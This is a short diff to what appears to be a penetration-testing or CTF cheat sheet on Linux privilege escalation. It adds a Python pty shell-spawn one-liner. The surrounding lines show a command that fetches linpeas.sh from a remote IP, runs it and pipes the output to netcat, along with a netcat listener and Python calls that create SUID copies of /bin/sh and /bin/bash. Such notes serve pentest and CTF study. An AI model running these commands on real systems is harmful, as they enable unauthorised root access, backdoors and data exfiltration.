@@ -51,6 +51,10 @@ Analysis with external files: curl [IP]:8000/linpeas.sh | sh | nc [IP] [PORT]
 Start HTTP Server: python3 -m http.server [PORT]
 Listen: nc -lvnp [PORT]
 
+One-liner (Spawn shell)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
 PHP Shell (Trigger)
 
 ```
@@ -70,6 +74,7 @@ import os
 os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
 os.system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")
 os.system('chmod u+s /bin/dash')
+
 
 ```
 
